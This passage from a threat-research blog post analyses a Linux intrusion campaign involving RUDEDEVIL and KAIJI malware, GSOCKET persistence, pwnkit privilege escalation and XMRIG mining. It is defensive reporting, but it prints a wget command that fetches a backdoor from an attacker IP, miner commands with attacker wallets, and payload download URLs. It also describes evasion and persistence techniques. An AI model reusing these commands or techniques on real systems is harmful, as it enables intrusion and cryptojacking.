<p>Another crucial thread is responsible for monitoring network traffic, specifically focusing on the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">eth0</code> network interface. This functionality is handled by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">getOutRates</code> function. The function begins by setting up necessary variables and opening the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/net/dev</code> file, which contains detailed network statistics for each interface.</p>
<p></p>
<p>If the file is successfully opened, the malware reads a block of data — up to 1024 bytes — and processes it to extract the relevant network statistics. It specifically looks for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">eth0</code> interface, parsing the output rate data using a standard string parsing method. If successful, the function returns the output rate for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">eth0</code>; otherwise, it returns <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0</code>, ensuring the malware continues functioning even if an error occurs.</p>
<p>This routine allows the malware to quietly monitor the network activity of the infected machine, likely to track data being sent or received across the interface.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-get_cpu_message-function" class="absolute -top-32"></span>Understanding the Get_Cpu_Message Function</h4>
<p>For CPU monitoring, the malware uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetCpuRates</code> function. This function continuously monitors the CPU usage by reading data from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/proc/stat</code>. Similar to how the network data is handled, the CPU statistics are read and parsed, allowing the malware to calculate the system&#x27;s CPU usage.</p>
<p></p>
<p>The function operates in an infinite loop, sleeping for one second between each iteration to avoid overwhelming the system. If the file cannot be opened for some reason, the function logs an error and gracefully exits. However, as long as it’s able to read the file, it continually monitors CPU usage, ensuring the malware remains aware of system performance.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-send_host_message-function" class="absolute -top-32"></span>Understanding the Send_Host_Message Function</h4>
<p>Perhaps the most critical thread is the one responsible for sending system information back to the malware operators. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">_SendInfo</code> function performs this task by collecting data about the infected system’s CPU and network usage. It begins by setting up buffers and preparing file paths to gather the necessary data. Depending on the system’s status, it formats the CPU and network usage into a string.</p>
<p></p>
<p>Additionally, the function checks whether a particular process is running on the system and adjusts its formatted message accordingly. Finally, it sends this formatted data back to the command-and-control server via a socket connection.</p>
<p>In essence, this function allows the malware to remotely monitor the infected machine, gathering key details like CPU load and network activity. The operators can use this information to assess the status of their infection and adjust their activities as needed.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="connecting-to-the-command-and-control-c2-server" class="absolute -top-32"></span>Connecting to the Command-and-Control (C2) Server</h3>
<p>Once all the threads are up and running, the malware shifts its focus to establishing a connection with its C2 server. This is managed by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ConnectServer</code> function in the main thread, which handles communication with the server and executes commands remotely.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="understanding-the-connectserver-function" class="absolute -top-32"></span>Understanding the ConnectServer Function</h4>
<p>The first task the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ConnectServer</code> function performs is establishing a connection to the C2 server using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ServerConnectCli</code>. After successfully connecting, the malware configures the socket to enable keep-alive settings, ensuring that the connection remains stable over extended periods of time.</p>
<p>Once the connection is set up, the malware collects various pieces of system information, including the hostname, user information, CPU specs, and memory details. This information is then sent to the server as an initial data payload, providing the attackers with a detailed view of the infected machine.</p>
<p>After this initial setup, the malware enters an ongoing loop where it awaits and processes commands from the server. The types of commands handled are varied and can include tasks like launching a DDoS attack, stopping or starting CPU-intensive operations, executing system commands, or managing cryptocurrency mining activities. The loop continues indefinitely, ensuring that the malware is ready to execute any command sent by its operators.</p>
<p>When the connection is no longer needed, or when the malware receives a termination command, it gracefully closes the socket, ending the session with the server.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="command-and-control-c2-commands" class="absolute -top-32"></span>Command-and-Control (C2) Commands</h4>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ConnectServer</code> function processes a variety of commands from the C2 server, each designed to control a different aspect of the infected system. Here’s a breakdown of the commands handled by the malware:</p>
<ul>
<li><strong>Case 4:</strong> The malware calls the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DealwithDDoS</code> function, likely initiating a Distributed Denial of Service (DDoS) attack.</li>
<li><strong>Case 5:</strong> Sets the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">StopFlag</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1</code>, which could signal the malware to stop specific tasks.</li>
<li><strong>Case 6:</strong> Downloads a file from the server using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http_get</code>, changes its permissions, and then executes it. This command allows the attackers to run additional malware or scripts on the infected machine.</li>
<li><strong>Case 7:</strong> Executes a system command using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">system</code> function, providing the attackers with direct control over the system’s command line.</li>
<li><strong>Case 8:</strong> Sets <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">StopCpu</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0</code>, restarting any previously halted CPU tasks.</li>
<li><strong>Case 9:</strong> Sets <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">StopCpu</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1</code>, halting all CPU tasks.</li>
<li><strong>Case 0xA:</strong> Updates the CPU mining configuration with new data and retrieves the PID of the current process, allowing the malware to modify its cryptocurrency mining operations.</li>
<li><strong>Case 0xB:</strong> Sets <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stopxmr</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1</code>, effectively stopping the XMRIG miner.</li>
<li><strong>Case 0xC:</strong> Resets <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stopxmr</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0</code> and retrieves the current process PID, resuming the mining activity.</li>
</ul>
<p></p>
<p>Each command gives the malware operators precise control over how the infected machine behaves, whether it’s participating in a DDoS attack, running new malware, or managing mining operations.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="variants-of-rudedevil-malware-and-xmrig-configuration" class="absolute -top-32"></span>Variants of RUDEDEVIL Malware and XMRIG Configuration</h3>
<p>While the file server mentioned before was active, we observed multiple versions of the RUDEDEVIL malware being uploaded. The core functionality of these versions remained largely the same, with the only significant variation being the embedded XMRIG commands used for cryptocurrency mining.</p>
<p>Each version of the malware was configured to connect to the same mining pool, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">c3pool.org</code>, but with slight differences in the parameters passed to the XMRIG miner:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p R</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p 2</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p php</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-o stratum+tcp://auto.c3pool[.]org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p 0</code></li>
</ul>
<p>Each of these commands directs the miner to connect to the same mining pool but specifies different wallets or configurations. By examining the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">c3pool</code> application, we confirmed that both XMR addresses associated with these commands are currently active and mining.</p>
<p></p>
<p>Additionally, through this analysis, we were able to estimate the total profit generated by these two mining campaigns, highlighting the financial impact of the RUDEDEVIL malware and its connection to illegal cryptocurrency mining operations.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="gsocket" class="absolute -top-32"></span>GSOCKET</h2>
<p>To establish persistence, the threat actor downloaded and installed <a href="https://github.com/hackerschoice/gsocket">GSOCKET</a>, a network utility designed to enable encrypted communication between machines that are behind firewalls or NAT. GSOCKET creates secure, persistent connections through the Global Socket Relay Network (GSRN). This open-source tool includes features like AES-256 encryption, support for end-to-end communication security, and compatibility with SSH, netcat, and TOR, which allow for encrypted file transfers, remote command execution, and even the creation of hidden services.</p>
<p>Although GSOCKET is not inherently malicious, its features can be leveraged for suspicious purposes.</p>
<p>Once deployed, GSOCKET performs several actions to maintain persistence and conceal its presence. First, it checks the system for active kernel processes to decide which process it will masquerade as:</p>
<p></p>
<p>It then creates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/shm/.gs-1000</code> directory to download and store its binary in shared memory. Additionally, by default, it sets up an <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/htop</code> directory under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/home/user/.config/htop/</code> to store both the GSOCKET binary and the secret key used for its operations.</p>
<p>Next, a cron job that runs the GSOCKET binary with the secret key every minute is set up.</p>
<p></p>
<p>The binary is executed under the name of a kernel process using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">exec -a [process_name]</code> command, further enhancing the ability to evade detection. The cron job includes a base64 encoded command that, when decoded, ensures the persistence mechanism is regularly executed and disguised as a legitimate kernel process:</p>
<p>When decoding the payload, we see how the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">defunct.dat</code> secret key is used as an argument to execute the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">defunct</code> binary, which is masqueraded as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[raid5wq]</code> through the use of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">exec -a </code>command:</p>
<p>In addition to using cron jobs, GSOCKET has the capability to establish persistence through shell profile modification, run control (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code>) and Systemd. GSOCKET enumerates potential persistence locations:</p>
<p></p>
<p>GSOCKET supports multiple webhooks, such as Telegram or Discord integrations, enabling remote control and notifications:</p>
<p></p>
<p>Finally, after installation, GSOCKET ensures that all files that are created or modified, will be timestomped to attempt to erase any trace of installation:</p>
<p></p>
<p>These features make GSOCKET an attractive tool for threat actors seeking stealth and persistence. In this campaign, GSOCKET was exploited to establish covert channels back to C2 servers while attempting to evade detection.</p>
<p>Additionally, a PHP payload was fetched from an external IP and saved as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">404.php</code>, likely functioning as a backdoor for future access. We did not manage to obtain this payload.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="post-compromise-dwell-time" class="absolute -top-32"></span>Post compromise dwell time</h3>
<p>After a three-week period of quiet with no noticeable activity, the threat actors resumed operations by utilizing the built-in Python3 to establish a reverse connection to a new command-and-control server.</p>
<p>After regaining access to the host, a newer version of the KAIJI malware was deployed.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="kaiji-malware-a-comparison-to-previous-samples" class="absolute -top-32"></span>KAIJI malware: a comparison to previous samples</h3>
<p>While investigating the files on the discovered file server, we saw a shell script. This shell script seems to be the main file used to download by an earlier stage, ensuring the correct architecture for the victim is used.</p>
<p></p>
<p>The same Shell script is found in other reports where this script is used to deploy KAIJI.</p>
<p>As part of our investigation, we analyzed the KAIJI malware samples found on the file server and compared them with samples identified by Black Lotus Labs in 2022. Their detailed analysis of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Chaos</code> (KAIJI) can be found in their blog post<a href="https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/"> here</a>.</p>
<p>Using <a href="https://github.com/google/bindiff">BinDiff</a>, a binary comparison tool, we compared the functions in the binaries. The analysis revealed that the code in our sample was identical to the previously identified KAIJI sample from 2022.</p>
<p></p>
<p>Although the code was the same, one critical difference stood out: the C2 server address. Although the functionality remained consistent in both binaries, they pointed to different C2 domains.</p>
<p>Delving deeper into the disassembly, we identified a function named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">main_Link</code>. This function is responsible for decoding the C2 server address used by the malware.</p>
<p></p>
<p>Once decoded, the function searches for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">|(odk)/*-</code> postfix in the address and removes it, leaving only the C2 domain and port. This process ensures the malware can communicate with its C2 server, though the address it contacts may change between samples.</p>
<p>Given that some resources have been published that statically reverse engineer KAIJI, we will instead take a more detailed look at its behaviors.</p>
<p></p>
<p>After execution, KAIJI creates several files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/</code> directories, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/id.services.conf</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/32678</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/.img</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev/.old</code>. These scripts are places to establish persistence.</p>
<p>Two services are set up, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/linux_kill</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">crond.service</code>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">crond.service</code> is executed by Systemd, while <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">linux_kill</code> is used for SysVinit persistence.</p>
<p>After reloading the Systemd daemon, the first network connection to the C2 is attempted.</p>
<p></p>
<p>Next, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Systemd Late generator</code> service file is created. More information on the workings of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Systemd</code>, and different ways of establishing persistence through this method can be found in our recent blog series dubbed <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">Linux Detection Engineering -  A primer on persistence mechanisms</a>.</p>
<p>KAIJI creates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/boot/System.img.config</code> file, which is an executable that is executed through the previously deployed <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Systemd</code> services. This binary, is amongst other binaries, another way of establishing persistence.</p>
<p></p>
<p>Next, KAIJI adjusts the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SELinux</code> policies to allow unauthorized actions. It searches audit logs for denied operations related to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">System.img.conf</code>, generates a new <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SELinux</code> policy to permit these actions, and installs the policy with elevated priority. By doing this, the malware bypasses security restrictions that would normally block its activity.</p>
<p>Additionally, it sets up multiple additional forms of persistence through bash profiles, and creates another two malicious artifacts; <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/libd1rpcld.so</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/.img</code>.</p>
<p>Right after, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/crontab</code> is altered through an echo command, ensuring that the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/.img</code> file is executed by root on a set schedule.</p>
<p></p>
<p>KAIJI continues to move several default system binaries to unusual locations, attempting to evade detection along the way.</p>
<p></p>
<p>KAIJI uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">renice</code> command to grant PID <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">2957</code>, one of KAIJI&#x27;s planted executables, the highest possible priority (on a scale of -20 to 19, lowest being the highest priority), ensuring it gets more CPU resources than other processes.</p>
<p>To evade detection, KAIJI employed the bind mount technique, a defense evasion method that obscures malicious activities by manipulating how directories are mounted and viewed within the system.</p>
<p>Finally, we see a trace of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code> executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/.img</code>, which was planted in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/crontab</code> file earlier.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="the-saga-continues" class="absolute -top-32"></span>The saga continues</h2>
<p>Two weeks later, the Apache backdoor became active again. Another backdoor was downloaded via the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">www-data</code> user through the Apache2 process using the command:</p>
<pre><code>sh -c wget http://91.92.241[.]103:8002/gk.php</code></pre>
<p>The contents of this payload remain unknown. At this stage, we observed attempts at manual privilege escalation, with the attackers deploying <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pspy64</code>. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Pspy</code> is a command-line tool for process snooping on Linux systems without requiring root permissions. It monitors running processes, including those initiated by other users, and captures events like cron job executions. This tool is particularly useful for analyzing system activity, spotting privilege escalation attempts, and auditing the commands and file system interactions triggered by processes in real time. It&#x27;s commonly leveraged by attackers for reconnaissance in post-compromise scenarios, giving them visibility into system tasks and potential vulnerabilities​.</p>
<p>Notably, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pspy64</code> was executed by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[rcu_preempt]</code> parent, indicating that the threat actors had transitioned from leveraging the web server backdoor to using the GSOCKET backdoor.</p>
<p>Further attempts at privilege escalation involved exploiting <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CVE-2021-4034</code>, also known as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pwnkit</code>. This vulnerability affects the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pkexec</code> component of the PolicyKit package in Linux systems, allowing an unprivileged user to execute arbitrary code with root privileges. By leveraging this flaw, an attacker can gain elevated access to the system, potentially leading to full control over the affected machine.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="custom-built-binaries" class="absolute -top-32"></span>Custom built binaries</h3>
<p>Right after, the attackers attempted to download a custom-built malware named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">apache2</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">apache2v86</code> from:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://62.72.22[.]91/apache2</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://62.72.22[.]91/apache2v86</code></li>
</ul>
<p>We obtained copies of these files, which currently have zero detections on VirusTotal. However, when executing them dynamically, we observed segmentation faults, and our telemetry confirmed segfault activity on the compromised host. Over a week, the threat actor attempted to alter, upload and execute these binaries more than 15 times, but due to repeated segfaults, it is unlikely that they succeeded in running this custom malware.</p>
<p>While the binaries failed to execute, they still provided valuable insights during reverse engineering. We uncovered several XOR-encoded strings within the samples.</p>
<p></p>
<p>The XOR key used to encode the strings was identified as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x79</code> (or the character <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">y</code>). After decoding the strings, we discovered fragments of an HTTP request header that the malware was attempting to construct:</p>
<pre><code>/934d9091-c90f-4edf-8b18-d44721ba2cdc HTTP/1.1
sec-ch-ua: &quot;Chromium&quot;;v=&quot;122&quot;, &quot;Google Chrome&quot;;v=&quot;122&quot;, &quot;Not-A.Brand&quot;;v=&quot;99
sec-ch-ua-platform: &quot;Windows&quot;
upgrade-insecure-requests: 1
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
referer: https://twitter[.]com
accept-language: ru,en-US;q=0.9
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.</code></pre>
<p>This indicates that the malware was in the process of constructing HTTP requests. However, based on the incomplete nature of the headers and the repeated failures in execution, it’s clear that this piece of software was not yet fully developed or operational.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="additional-reconnaissance" class="absolute -top-32"></span>Additional reconnaissance</h3>
<p>The attackers continued to use tools from The Hacker’s Choice, by downloading and executing <a href="https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">whatserver.sh</code></a>.</p>
<p>This Shell script is designed to gather and display server information. It extracts details such as the fully qualified domain names (FQDNs) from SSL certificates, Nginx, and Apache configuration files, along with system resource information like CPU and memory usage, virtualization details, and network settings. The script can also summarize recent activities, including last logged-in users and currently listening services.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="mining-activities" class="absolute -top-32"></span>Mining activities</h3>
<p>After nearly two weeks of manual exploitation attempts, the threat actors ceased their efforts to escalate privileges, likely having failed to gain root access. Instead, they established persistence as the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">www-data</code> user, leveraging GSOCKET to set up an SSL connection, which was disguised as a kernel process called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[mm_percpu_wq]</code>.</p>
<p>After decoding the base64 contents, we get a very familiar looking output:</p>
<p>Through our behavioral rules, we see the threat actor listing the current user’s crontab entries, and echoing a payload directly into the crontab.</p>
<p>This command tries to download <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://gcp.pagaelrescate[.]com:8080/ifindyou</code> every minute, and pipe it to bash. Looking at the contents of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ifindyou</code>, we see the following Bash script:</p>
<p></p>
<p>This script gathers hostname and IP information, downloads the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">SystemdXC</code> archive from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC</code> (XMRIG), stores this in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp/SystemdXC</code>, extracts the archive and executes it with the necessary parameters to start mining Bitcoin.</p>
<p>When examining the mining command, we can see how the malware configures XMRIG:</p>
<p>This command connects to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">unmineable.com</code> mining pool, using the infected machine’s hostname as an identifier in the mining process. At the time of writing, there are 15 active workers mining Bitcoin for the wallet address <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz</code>.</p>
<p></p>
